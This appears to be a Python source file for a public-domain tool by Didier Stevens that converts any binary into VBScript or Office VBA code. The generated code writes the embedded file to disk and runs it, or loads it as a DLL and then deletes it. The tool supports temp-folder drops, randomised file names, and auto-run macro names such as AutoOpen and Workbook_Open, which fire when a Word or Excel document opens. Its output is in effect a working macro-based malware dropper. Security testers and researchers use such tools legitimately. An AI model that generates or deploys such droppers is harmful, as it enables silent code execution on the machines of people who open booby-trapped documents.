#!/usr/bin/env python

from __future__ import print_function

__description__ = 'Tool to create a VBScript (VBS/VBA) containing an embedded (executable) file'
__author__ = 'Didier Stevens'
__version__ = '0.4'
__date__ = '2021/01/05'

"""
Source code put in the public domain by Didier Stevens, no Copyright
https://DidierStevens.com
Use at your own risk

History:
  2008/02/01: V0.1
  2008/03/09: V0.2 Splitting for Office
  2008/03/10: Refactoring
  2008/03/14: V0.3 LoadLibrary
  2017/09/12: V0.4 added option temporaryfolder
  2018/02/27: Added option -e
  2021/01/02: refactoring; added -m; added _RANDOM_
  2021/01/05: added VBA7 declarations

Todo:

"""

import optparse
import textwrap

def PrintManual():
    manual = r'''
Manual:

This manual is TBC.

Names for option -e:

Runs when a Word document is opened: AutoExec, AutoOpen, Document_Open
Runs when a Word document is closed: AutoExit, AutoClose, Document_Close, DocumentBeforeClose
Runs when a Word document is modified: Document_Change
Runs when a new Word document is created: AutoNew, Document_New, NewDocument

Runs when a Publisher document is opened: Document_Open
Runs when a Publisher document is closed: Document_BeforeClose

Runs when an Excel document is opened: Auto_Open, Workbook_Open, Workbook_Activate
Runs when an Excel document is closed: Auto_Close, Workbook_Close

Use _RANDOM_ in the filename with option -f to generate VBscript code that will replace _RANDOM_ with a random integer.

'''
    for line in manual.split('\n'):
        print(textwrap.fill(line, 79))

def File2VBScript(filenameIn, filenameOut, options):
    infile = open(filenameIn, 'rb')
    outfile = open(filenameOut, 'w')

    generateRandomFilename = '_RANDOM_' in options.filename
        
    if options.loadlibrary:
        print('#If VBA7 Then', file=outfile)
        print('Private Declare PtrSafe Function LoadLibrary Lib "KERNEL32" Alias "LoadLibraryA" (ByVal strFileName As String) As LongPtr', file=outfile)
        print('Private Declare PtrSafe Function FreeLibrary Lib "KERNEL32" (ByVal hLibrary As LongPtr) As Long', file=outfile)
        print('#Else', file=outfile)
        print('Private Declare Function LoadLibrary Lib "KERNEL32" Alias "LoadLibraryA" (ByVal strFileName As String) As Long', file=outfile)
        print('Private Declare Function FreeLibrary Lib "KERNEL32" (ByVal hLibrary As Long) As Long', file=outfile)
        print('#End If', file=outfile)
        print('', file=outfile)

    if not options.office:
        print(options.entryname, file=outfile)
        print('', file=outfile)

    if options.loadlibrary:
        print('Sub %s()' % options.entryname, file=outfile)
        print('\tDim hLibrary', file=outfile)
        print('\tDim strFile', file=outfile)
        print('', file=outfile)
        print('\tstrFile = TempFilename', file=outfile)
        print('\tDumpFile strFile', file=outfile)
        print('\thLibrary = LoadLibrary(strFile)', file=outfile)
        print('\tFreeLibrary hLibrary', file=outfile)
        print('\tDeleteFile strFile', file=outfile)
        print('End Sub', file=outfile)
        print('', file=outfile)
    else:
        print('Sub %s()' % options.entryname, file=outfile)
        print('\tDim strFile', file=outfile)
        print('', file=outfile)
        if options.temporaryfolder:
            print('\tstrFile = TempFilename', file=outfile)
        elif generateRandomFilename:
            print('\tstrFile = RandomizeFilename("%s")' % options.filename, file=outfile)
        else:
            print('\tstrFile = "%s"' % options.filename, file=outfile)
        print('\tDumpFile strFile', file=outfile)
        if not options.norun:
            print('\tRunFile strFile', file=outfile)
        print('End Sub', file=outfile)
        print('', file=outfile)

    if options.temporaryfolder:
        print('Function TempFilename()', file=outfile)
        print('\tDim objFSO', file=outfile)
        print('', file=outfile)
        print('\tSet objFSO = CreateObject("Scripting.FileSystemObject")', file=outfile)
        if generateRandomFilename:
            print('\tTempFilename = objFSO.BuildPath(objFSO.GetSpecialFolder(2), RandomizeFilename("%s"))' % options.filename, file=outfile)
        else:
            print('\tTempFilename = objFSO.BuildPath(objFSO.GetSpecialFolder(2), "%s")' % options.filename, file=outfile)
        print('End Function', file=outfile)
        print('', file=outfile)

    if generateRandomFilename:
        print('Function RandomizeFilename(ByVal strFilename As String) As String', file=outfile)
        print('\tRandomizeFilename = Replace(strFilename, "_RANDOM_", CStr(Int(Rnd() * 1000000)))', file=outfile)
        print('End Function', file=outfile)
        print('', file=outfile)

    if options.loadlibrary:
        print('Function TempFilename()', file=outfile)
        print('\tDim objFSO', file=outfile)
        print('', file=outfile)
        print('\tSet objFSO = CreateObject("Scripting.FileSystemObject")', file=outfile)
        print('\tTempFilename = objFSO.BuildPath(objFSO.GetSpecialFolder(2), objFSO.GetTempName)', file=outfile)
        print('End Function', file=outfile)
        print('', file=outfile)
        print('Sub DeleteFile(strFilename)', file=outfile)
        print('\tDim objFSO', file=outfile)
        print('', file=outfile)
        print('\tSet objFSO = CreateObject("Scripting.FileSystemObject")', file=outfile)
        print('\tobjFSO.DeleteFile strFilename', file=outfile)
        print('End Sub', file=outfile)
    else:
        print('Sub RunFile(strFilename)', file=outfile)
        print('\tDim sh', file=outfile)
        print('', file=outfile)
        print('\tSet sh = CreateObject("WScript.Shell")', file=outfile)
        print('\tsh.Run strFilename', file=outfile)
        print('End Sub', file=outfile)
    print('', file=outfile)

    print('Sub WriteBytes(objFile, strBytes)', file=outfile)
    print('\tDim aNumbers', file=outfile)
    print('\tDim iIter', file=outfile)
    print('', file=outfile)
    print('\taNumbers = split(strBytes)', file=outfile)
    print('\tfor iIter = lbound(aNumbers) to ubound(aNumbers)', file=outfile)
    print('\t\tobjFile.Write Chr(aNumbers(iIter))', file=outfile)
    print('\tnext', file=outfile)
    print('End Sub', file=outfile)
    print('', file=outfile)

    countLine = 0
    countSubs = 1
    line = ''

    print('Sub DumpFile%d(objFile)' % countSubs, file=outfile)

    while True:
        inbyte = infile.read(1)
        if not inbyte:
            break
        if len(line) > 0:
            line = line + ' '
        line = line + '%d' % ord(inbyte)
        if len(line) > 80:
            print('\tWriteBytes objFile, "%s"' % line, file=outfile)
            line = ''
            countLine += 1
            if options.office and countLine > 99:
                countLine = 0
                print('End Sub', file=outfile)
                print('', file=outfile)
                countSubs += 1
                print('Sub DumpFile%d(objFile)' % countSubs, file=outfile)

    if len(line) > 0:
        print('\tWriteBytes objFile, "%s"' % line, file=outfile)

    print('End Sub', file=outfile)
    print('', file=outfile)
    print('Sub DumpFile(strFilename)', file=outfile)
    print('\tDim objFSO', file=outfile)
    print('\tDim objFile', file=outfile)
    print('', file=outfile)
    print('\tSet objFSO = CreateObject("Scripting.FileSystemObject")', file=outfile)
    print('\tSet objFile = objFSO.OpenTextFile(strFilename, 2, true)', file=outfile)
    for iIter in range(1, countSubs+1):
        print('\tDumpFile%d objFile' % iIter, file=outfile)
    print('\tobjFile.Close', file=outfile)
    print('End Sub', file=outfile)

    infile.close()
    outfile.close()

def Main():
    """Create a VBScript containing an embedded (executable) file
    """

    moredesc = '''

Source code put in the public domain by Didier Stevens, no Copyright
Use at your own risk
https://DidierStevens.com'''

    oParser = optparse.OptionParser(usage='usage: %prog [options] infile outfile.vbs/.vba\n' + __description__ + moredesc, version='%prog ' + __version__)
    oParser.add_option('-m', '--man', action='store_true', default=False, help='Print manual')
    oParser.add_option('-f', '--filename', default='file.exe', help='use FILENAME as the name of the file to dump')
    oParser.add_option('-n', '--norun', action='store_true', default=False, help="don't execute the dumped file")
    oParser.add_option('-o', '--office', action='store_true', default=False, help='create VBA for Microsoft Office')
    oParser.add_option('-l', '--loadlibrary', action='store_true', default=False, help='generate a script that will create and load the file infile as a DLL')
    oParser.add_option('-t', '--temporaryfolder', action='store_true', default=False, help='use the temporary folder to write the file')
    oParser.add_option('-e', '--entryname', default='DoIt', help='Name to use for the entry subroutine')
    (options, args) = oParser.parse_args()

    if options.man:
        oParser.print_help()
        PrintManual()
        return

    if len(args) != 2:
        oParser.print_help()
        print('')
        print('  Use this program to generate a VBscript outfile.vbs/outfile.vba that will create')
        print('  file infile and execute it.')
        print('  Source code put in the public domain by Didier Stevens, no Copyright')
        print('  Use at your own risk')
        print('  https://DidierStevens.com')

    else:
        File2VBScript(args[0], args[1], options)

if __name__ == '__main__':
    Main()
